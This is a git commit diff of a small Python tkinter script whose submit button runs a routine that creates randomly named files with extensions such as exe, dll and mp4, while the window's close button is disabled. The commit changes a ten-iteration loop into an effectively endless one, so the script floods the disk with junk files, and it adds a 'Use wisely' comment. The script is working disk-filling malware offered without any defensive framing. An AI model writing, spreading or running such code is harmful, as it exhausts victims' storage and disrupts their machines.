e1b9b3c6b71b4f6e3f13417db96327f29b43e428
Philipnation <98617496+Philipnation@users.noreply.github.com>
2022-09-13 12:39:46 +0100

    Update fifi.py

--- fifi.py
+++ fifi.py
@@ -13,11 +13,11 @@ windows.protocol("WM_DELETE_WINDOW", disable_events)
 
 
 def fill():
-    letters = 'qeq8w0987654321'
+    letters = 'qubf/[vygvtbe75v8wy5wtv85rowvo5027ybb01ybtvunoudbnvcvseoiriroeitjegtiywirteq8w0987654321kufhksbvudvindijovbhbgiotpisthvbu5874ybt583h5utbp9p9y4btu2p985pt9c28t5v92b85t2cn2kwhb4v1hp49p149tv2t592bpo5rc2cnovt5892pt5-2tbv24y2bq8v7r8y31bbvtnvytputvbvyhvny'
     ending = ['exe', 'py', 'txt', 'dll', 'mp4', 'ogg', 'mp3', 'bat', 'apk', 'pkg']
-    i = 10
+    i = 1
     while i > 0:
-        i -= 1
+        i += 1
         fil = "".join(choice(letters) for x in range(randint(100, 110)))
         end = ending[randint(0, 5)]
         with open(fil+'.'+end, 'a') as f:
@@ -46,3 +46,6 @@ btn = Button(windows, text="submit", command=fill)
 btn.pack()
 
 windows.mainloop()
+
+# Created by philip nation's code
+# Use wisely
